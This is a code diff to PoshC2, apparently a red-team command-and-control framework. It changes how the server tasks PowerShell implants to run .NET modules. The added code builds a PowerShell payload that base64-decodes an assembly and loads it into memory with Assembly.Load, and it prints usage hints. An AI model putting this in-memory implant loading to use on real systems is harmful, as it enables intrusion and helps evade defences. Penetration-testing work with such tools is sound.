@@ -9,7 +9,7 @@ from poshc2 import Colours
 from poshc2.Utils import new_implant_id
 from poshc2.server.Config import DownloadsDirectory, ReportsDirectory
 from poshc2.server.Config import mitre_mapping
-from poshc2.server.Core import decrypt, decrypt_bytes_gzip, process_mimikatz, print_bad
+from poshc2.server.Core import decrypt, decrypt_bytes_gzip, process_mimikatz, print_bad, print_good
 from poshc2.server.Core import load_module, load_module_sharp, encrypt, default_response
 from poshc2.server.ImplantExtensions import new_implant, display, autoruns
 from poshc2.server.ImplantType import ImplantType
@@ -573,9 +573,17 @@ def new_task(path):
                     elif command.startswith("load-module "):
                         try:
                             module_name = command.replace("load-module ", "")
-
-                            if ".exe" in module_name or ".dll" in module_name:
-                                base64_module = load_module_sharp(module_name)
+                            if ".exe" in module_name or ".dll" in module_name:                                                                
+                                if implant_type==ImplantType.PowerShellHttp:
+                                    module=load_module_sharp(module_name)
+                                    base64_module=f"$ps=\"{module}\";$dllbytes=[System.Convert]::FromBase64String($ps);$assembly=[System.Reflection.Assembly]::Load($dllbytes)"
+                                    print_bad("Usage Manual: [SharpTask.Program]::printUsage(@(\"Arg1\", \"Arg2\"));")
+                                    print_bad("OR: load-module Invoke-Sharp.ps1")
+                                    print_bad("OR: Get-Help Invoke-Sharp -examples")
+                                    print_bad("OR: List-Assemblies")
+                                else:
+                                    base64_module = load_module_sharp(module_name)
+                            # if its a powershell implant
                             else:
                                 base64_module = load_module(module_name)
                             command = f"load-module{base64_module}"
